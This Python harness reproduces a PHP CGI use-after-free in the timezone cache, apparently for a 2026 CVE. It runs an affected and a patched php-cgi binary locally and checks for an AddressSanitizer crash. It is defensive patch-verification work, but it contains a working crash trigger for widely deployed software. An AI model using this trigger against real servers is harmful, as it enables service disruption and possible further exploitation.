#!/usr/bin/env python3
"""CVE-2026-129496 / GHSA-gr4f-wgx5-jpfv: stale DATEG(tzcache) read on CGI.

Affected PHP writes error-log timestamps with php_format_date(..., localtime=1).
A diagnostic written through PHP's *file* error_log during module startup
allocates the timezone cache in temporary startup memory; that memory is
released at the end of startup but DATEG(tzcache) still points at it until the
date extension's request init. An early request diagnostic (max_input_vars)
then dereferences the stale cache while building its timestamp.

The vendor advisory lists an invalid date.timezone value as a confirmed
startup diagnostic, so this harness needs no third-party extension. It replays
the exact two-diagnostic sequence against two php-cgi binaries and requires:

  affected: nonzero rc, ASan SEGV whose stack passes through
            php_format_date -> timelib_get_time_zone_info -> _estrdup/strlen
  fixed:    rc 0, "Hello world", no ASan report
  control:  without the startup diagnostic, both binaries are clean

The fix compared here is the upstream one-line guard in main/main.c:
  php_format_date("d-M-Y H:i:s e", 13, error_time,
                  PG(modules_activated) && EG(active));
The "fixed" binary can be the release-ASan build with only that line changed
and main.lo/php-cgi rebuilt; it is patch-sensitive evidence, not a claim of a
full patched-version build.

Loopback only: php-cgi is invoked directly with CGI environment variables, no
network listener and no external target.

Usage: python3 php2shell-cve129496-tzcache.py AFFECTED_CGI FIXED_CGI [OUTDIR]
"""
import os
import pathlib
import subprocess
import sys

PHP_BODY = '<?php echo "Hello world\\n"; ?>\n'


def run(cgi, outdir, tag, *, startup_diagnostic):
    """Run one php-cgi request; return (rc, stdout, stderr, logtext)."""
    script = outdir / 'tzcache.php'
    script.write_text(PHP_BODY)
    errlog = outdir / f'{tag}.errlog'
    if errlog.exists():
        errlog.unlink()
    args = [str(cgi), '-n',
            '-d', 'max_input_vars=1',
            '-d', 'log_errors=1',
            '-d', f'error_log={errlog}',
            '-d', 'display_errors=1']
    if startup_diagnostic:
        args += ['-d', 'date.timezone=Not/AZone']
    env = os.environ.copy()
    env.update({
        'GATEWAY_INTERFACE': 'CGI/1.1',
        'REQUEST_METHOD': 'GET',
        'SCRIPT_FILENAME': str(script),
        'QUERY_STRING': 'a=1&b=2',
        'REDIRECT_STATUS': '1',
        'SERVER_PROTOCOL': 'HTTP/1.1',
        'ASAN_OPTIONS': 'detect_leaks=0:abort_on_error=0',
    })
    # Default ZendMM is required: with USE_ZEND_ALLOC=0 the startup-memory
    # free does not happen and both binaries are clean (recorded negative).
    env.pop('USE_ZEND_ALLOC', None)
    cp = subprocess.run(args, env=env, stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE, timeout=60)
    out = cp.stdout.decode(errors='replace')
    err = cp.stderr.decode(errors='replace')
    (outdir / f'{tag}.out').write_text(out)
    (outdir / f'{tag}.stderr').write_text(err)
    logtext = errlog.read_text(errors='replace') if errlog.exists() else ''
    return cp.returncode, out, err, logtext


def crashed(rc, err):
    return (rc != 0 and 'AddressSanitizer' in err
            and 'php_format_date' in err
            and 'timelib_get_time_zone_info' in err)


def main():
    if len(sys.argv) < 3:
        print(__doc__)
        return 2
    affected = pathlib.Path(sys.argv[1]).resolve()
    fixed = pathlib.Path(sys.argv[2]).resolve()
    outdir = (pathlib.Path(sys.argv[3]).resolve() if len(sys.argv) > 3 else
              pathlib.Path(__file__).resolve().parent.parent / 'build' /
              'evidence' / 'w53-129496')
    outdir.mkdir(parents=True, exist_ok=True)

    a_rc, a_out, a_err, a_log = run(affected, outdir, 'affected',
                                   startup_diagnostic=True)
    f_rc, f_out, f_err, f_log = run(fixed, outdir, 'fixed',
                                   startup_diagnostic=True)
    ca_rc, ca_out, ca_err, ca_log = run(affected, outdir, 'control-affected',
                                        startup_diagnostic=False)
    cf_rc, cf_out, cf_err, cf_log = run(fixed, outdir, 'control-fixed',
                                        startup_diagnostic=False)

    ok = (crashed(a_rc, a_err) and f_rc == 0 and 'Hello world' in f_out
          and 'AddressSanitizer' not in f_err and ca_rc == 0
          and 'Hello world' in ca_out and 'AddressSanitizer' not in ca_err
          and cf_rc == 0 and 'Hello world' in cf_out
          and 'AddressSanitizer' not in cf_err)
    verdict = 'CONFIRMED' if ok else 'NOT CONFIRMED'
    lines = [
        f'verdict: {verdict}',
        f'affected: {affected} rc={a_rc} asan={crashed(a_rc, a_err)}',
        f'  startup diagnostic logged={"Invalid date.timezone" in a_log}',
        f'fixed: {fixed} rc={f_rc} asan={"AddressSanitizer" in f_err}',
        f'control affected rc={ca_rc} asan={"AddressSanitizer" in ca_err}',
        f'control fixed rc={cf_rc} asan={"AddressSanitizer" in cf_err}',
        'condition: default ZendMM (USE_ZEND_ALLOC unset); '
        'USE_ZEND_ALLOC=0 is a recorded negative',
    ]
    (outdir / 'verdict.txt').write_text('\n'.join(lines) + '\n')
    print('\n'.join(lines))
    return 0 if ok else 1


if __name__ == '__main__':
    sys.exit(main())
